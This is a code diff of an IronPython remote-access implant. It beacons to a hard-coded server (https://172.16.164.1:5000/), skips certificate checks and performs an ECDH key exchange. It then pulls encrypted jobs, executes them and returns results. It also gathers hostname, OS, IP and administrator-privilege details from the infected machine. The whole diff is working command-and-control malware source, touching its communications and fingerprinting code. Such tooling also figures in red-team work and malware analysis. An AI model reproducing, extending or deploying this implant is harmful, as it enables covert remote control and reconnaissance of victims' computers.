@@ -3,25 +3,52 @@
 import clr
 from System import Convert, Guid, Environment, Uri, Console, Array, Byte, Random, IntPtr
 
-clr.AddReference("BouncyCastle.Crypto")
-clr.AddReference("IronPython")
+try:
+    assert DEBUG
+    clr.AddReference(IronPythonDLL)
+except NameError:
+    DEBUG = True
+    print "Set DEBUG: {}".format(DEBUG)
+    try:
+        import traceback
+    except ImportError:
+        print "[!] Error importing traceback module, full tracebacks will not be displayed"
+    clr.AddReference("IronPython")
+
+try:
+    assert GUID
+except NameError:
+    GUID = Guid.NewGuid().ToString()
+    print "Created GUID: {}".format(GUID)
+
+try:
+    assert URL
+except NameError:
+    URL = Uri(Uri("https://172.16.164.1:5000/"), GUID)
+    print "Set URL: {}\n".format(URL)
+
 clr.AddReference("System.Management")
 clr.AddReference("System.Web.Extensions")
+clr.AddReference("Microsoft.VisualBasic")
 clr.AddReference("Boo.Lang.Interpreter")
+clr.AddReference("BouncyCastle.Crypto")
 
 from System.Text import Encoding
+from System.Management import ManagementObject
 from System.Diagnostics import Process
 from System.Security.Principal import WindowsIdentity, WindowsPrincipal, WindowsBuiltInRole
 from System.IO import StreamReader, Stream, MemoryStream, SeekOrigin
-from System.Net import WebRequest, ServicePointManager, SecurityProtocolType, CredentialCache, NetworkInformation
+from System.IO.Compression import GZipStream, CompressionMode
+from System.Net import HttpWebRequest, WebRequest, ServicePointManager, SecurityProtocolType, CredentialCache, NetworkInformation
 from System.Net.Security import RemoteCertificateValidationCallback
 from System.Threading import Thread
 from System.Security.Cryptography import Aes, PaddingMode, CryptoStream, CryptoStreamMode, AsymmetricAlgorithm, HMACSHA256, RNGCryptoServiceProvider
 from System.Threading.Tasks import Task
 from System.Web.Script.Serialization import JavaScriptSerializer
+from Microsoft.VisualBasic.Devices import ComputerInfo
+from Microsoft.Win32 import Registry
 from IronPython.Hosting import Python
 from Boo.Lang.Interpreter import InteractiveInterpreter
-from Microsoft.Win32 import Registry
 
 from System.Text.RegularExpressions import Regex
 from System import StringComparison
@@ -33,8 +60,9 @@ from Org.BouncyCastle.Math import BigInteger
 from Org.BouncyCastle.Crypto.Digests import Sha256Digest
 from Org.BouncyCastle.Crypto.Agreement import ECDHBasicAgreement
 
-def urljoin(base, suffix):
-    return "{}/{}".format(base, suffix)
+def urljoin(*args):
+    return "/".join(map(lambda x: str(x).rstrip('/'), args))
+
 
 def print_traceback():
     try:
@@ -100,18 +128,31 @@ class Serializable(object):
 
 
 class Response(object):
-    def __init__(self, response):
-        self.response = response
+    def __init__(self, request):
+        self.request = request
 
     @property
     def text(self):
-        return StreamReader(self.response.GetResponseStream()).ReadToEnd()
+        response = self.request.GetResponse()
+        reader = StreamReader(response.GetResponseStream())
+        data = reader.ReadToEnd()
+        reader.Close()
+        response.Close()
+        self.request.Abort()
+        return data
 
     @property
     def bytes(self):
+        data = None
+        response = self.request.GetResponse()
         with MemoryStream() as memstream:
-            self.response.GetResponseStream().CopyTo(memstream)
-            return memstream.ToArray()
+            with response.GetResponseStream() as reader:
+                reader.CopyTo(memstream)
+                data = memstream.ToArray()
+                reader.Close
+        response.Close()
+        self.request.Abort()
+        return data
 
 
 class Requests(object):
@@ -120,38 +161,43 @@ class Requests(object):
         ServicePointManager.SecurityProtocol = ssl_versions
         if not verify:
             ServicePointManager.ServerCertificateValidationCallback = RemoteCertificateValidationCallback(lambda srvPoint, certificate, chain, errors: True)
+        ServicePointManager.Expect100Continue = False
 
     def post(self, url, payload=None):
         r = WebRequest.Create(url)
+        r.ServicePoint.ConnectionLimit = 500
+        r.Timeout = 30000
         r.ContentType = "application/octet-stream"
         r.Method = "POST"
         if self.proxy_aware:
             r.Proxy = WebRequest.GetSystemWebProxy()
             r.Proxy.Credentials = CredentialCache.DefaultCredentials
-
+       
         if len(payload):
             if type(payload) != Array[Byte]:
                 data = Encoding.UTF8.GetBytes(payload)
             else:
                 data = payload
-
             r.ContentLength = data.Length
-            requestStream = r.GetRequestStream()
-            requestStream.Write(data, 0, data.Length)
-            requestStream.Close()
-
-        return Response(r.GetResponse())
+            with r.GetRequestStream() as requestStream:
+                requestStream.Write(data, 0, data.Length)
+                requestStream.Close()
+        
+        return Response(r)
+        
 
     def get(self, url):
         r = WebRequest.Create(url)
+        r.ServicePoint.ConnectionLimit = 500
+        r.Timeout = 30000
         r.ContentType = "application/octet-stream"
         r.Method = "GET"
         if self.proxy_aware:
             r.Proxy = WebRequest.GetSystemWebProxy()
             r.Proxy.Credentials = CredentialCache.DefaultCredentials
-
-        return Response(r.GetResponse())
-
+        
+        return Response(r)
+        
 
 class Crypto(object):
     def __init__(self):
@@ -188,7 +234,7 @@ class Crypto(object):
     def derive_key(self, bobPublicKey, alicePrivateKey):
         aKeyAgree = ECDHBasicAgreement()
         aKeyAgree.Init(alicePrivateKey)
-        sharedSecretBytes = self.ResizeRight(aKeyAgree.CalculateAgreement(bobPublicKey).ToByteArray(), 66)
+        sharedSecretBytes = self.resize_right(aKeyAgree.CalculateAgreement(bobPublicKey).ToByteArray(), 66)
        
         digest = Sha256Digest()
         symmetricKey = Array.CreateInstance(Byte, digest.GetDigestSize())
@@ -198,7 +244,7 @@ class Crypto(object):
         return symmetricKey
     
     # Resize but pad zeroes to the left instead of to the right like Array.Resize
-    def ResizeRight(self, b, length):
+    def resize_right(self, b, length):
         if b.Length == length:
             return b
         if b.Length > length:
@@ -264,8 +310,8 @@ class Crypto(object):
 
 
 class Comms(Serializable):
-    def __init__(self, sleep):
-        self.sleep = sleep
+    def __init__(self, client):
+        self.client = client
         self.requests = Requests()
         self.crypto = None
 
@@ -282,8 +328,7 @@ class Comms(Serializable):
                 if DEBUG:
                     print "Error performing key exchange: " + str(e)
                     print_traceback()
-
-            Thread.Sleep(self.sleep)
+            Thread.Sleep(self.client.SLEEP)
 
     def send_job_results(self, results, job_id):
         self.key_exchange()
@@ -305,7 +350,7 @@ class Comms(Serializable):
                     print "Error performing sending job results: " + str(e)
                     print_traceback()
 
-            Thread.Sleep(self.sleep)
+            Thread.Sleep(self.client.SLEEP)
 
     def get_job(self):
         self.key_exchange()
@@ -314,14 +359,15 @@ class Comms(Serializable):
             try:
                 job = self.requests.get(self.jobs_url).bytes
                 if len(job):
-                    return JavaScriptSerializer().DeserializeObject(Encoding.UTF8.GetString(self.crypto.Decrypt(job)))
+                    return JavaScriptSerializer().DeserializeObject(
+                        Encoding.UTF8.GetString(self.crypto.Decrypt(job)))
                 return
             except Exception as e:
                 if DEBUG:
                     print "Error performing getting jobs: " + str(e)
                     print_traceback()
 
-            Thread.Sleep(self.sleep)
+            Thread.Sleep(self.client.SLEEP)
 
     def __str__(self):
         return 'http'
@@ -422,7 +468,10 @@ class STClient(Serializable):
         self.DOTNET_VERSION = str(Environment.Version)
         self.HIGH_INTEGRITY = self.is_high_integrity()
         self.IP = self.get_network_addresses()
-        self.OS = "{} ({})".format(Environment.OSVersion.ToString(), Environment.OSVersion.Version)
+        try:
+            self.OS = "{} ({})".format(ComputerInfo().OSFullName, Environment.OSVersion.Version)
+        except:
+            self.OS = "{} ({})".format(Environment.OSVersion.ToString(), Environment.OSVersion.Version)
         self.OS_ARCH = "x64" if IntPtr.Size == 8 else "x86"
         try:
             self.OS_RELEASE_ID = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId", "")
@@ -433,7 +482,7 @@ class STClient(Serializable):
         self.HOSTNAME = Environment.MachineName
         self.JOBS = len(self.__jobs)
         self.URL = str(URL)
-        self.COMMS = Comms(self.SLEEP)
+        self.COMMS = Comms(self)
 
         self.main()
 
@@ -460,6 +509,7 @@ class STClient(Serializable):
                 self.__jobs.append(STJob(self, job))
 
             Thread.CurrentThread.Join(self.SLEEP)
+            #Thread.Sleep(client.SLEEP)
 
 
 STClient()
